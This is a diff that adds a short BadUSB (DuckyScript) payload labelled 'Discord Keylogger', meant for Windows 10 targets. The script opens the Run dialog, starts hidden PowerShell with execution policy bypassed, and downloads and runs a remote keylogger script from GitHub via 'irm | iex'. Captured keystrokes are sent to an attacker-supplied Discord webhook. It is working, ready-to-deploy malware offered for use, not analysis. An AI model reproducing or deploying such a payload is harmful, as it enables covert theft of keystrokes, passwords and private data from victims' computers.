@@ -1,0 +1,14 @@
+REM Title: Discord Keylogger
+REM Author: White Hat Hacker
+REM Description: This script will log all keystrokes on the target device and send after 10 seconds of inactivity.
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB Webhook
+REM Directions: Replace WEBOOK_HERE with the URL of webhook inside ''.
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Keylog-to-DC.ps1 | iex
+ENTER
